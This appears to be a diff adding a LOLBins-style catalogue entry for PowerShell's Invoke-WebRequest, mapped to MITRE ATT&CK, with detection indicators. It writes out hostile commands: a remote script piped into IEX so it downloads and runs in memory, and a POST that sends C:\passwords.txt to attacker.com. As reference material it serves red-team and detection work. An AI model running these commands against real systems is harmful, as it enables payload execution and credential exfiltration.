@@ -1,0 +1,49 @@
+---
+Name: Invoke-WebRequest
+Description: PowerShell cmdlet for making HTTP/HTTPS requests
+Author: LOLBins Project
+Created: 2026-01-16
+Commands:
+  - Command: powershell.exe -c "Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile 'C:\temp\payload.exe'"
+    Description: Download files from remote URLs using PowerShell
+    Usecase: Download payloads or tools during penetration testing
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows 7+, Windows Server 2008 R2+
+  - Command: powershell.exe -c "IWR -Uri 'http://example.com/script.ps1' | IEX"
+    Description: Download and execute PowerShell script in memory (alias version)
+    Usecase: Execute remote scripts without touching disk
+    Category: Execute
+    Privileges: User
+    MitreID: T1059.001
+    OperatingSystem: Windows 7+, Windows Server 2008 R2+
+  - Command: powershell.exe -c "Invoke-WebRequest -Uri 'http://attacker.com/' -Method POST -Body (Get-Content C:\passwords.txt)"
+    Description: Upload file contents via HTTP POST
+    Usecase: Exfiltrate data to remote server
+    Category: Upload
+    Privileges: User
+    MitreID: T1048.003
+    OperatingSystem: Windows 7+, Windows Server 2008 R2+
+  - Command: powershell.exe -c "Invoke-WebRequest -Uri 'http://example.com/file' -UseBasicParsing"
+    Description: Download files without IE dependencies
+    Usecase: Download files on systems without Internet Explorer configured
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows 7+, Windows Server 2008 R2+
+Full_Path:
+  - Path: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+  - Path: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+Detection:
+  - IOC: PowerShell making outbound network connections
+  - IOC: Invoke-WebRequest in PowerShell command-line arguments
+  - IOC: PowerShell downloading executables or scripts
+  - Sigma: https://github.com/SigmaHQ/sigma/search?q=Invoke-WebRequest
+  - Elastic: https://github.com/elastic/detection-rules/search?q=powershell+download
+Resources:
+  - Link: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest
+  - Link: https://attack.mitre.org/techniques/T1059/001/
+Acknowledgement:
+  - Person: Microsoft PowerShell Team
+  - Person: PowerShell Security Research Community
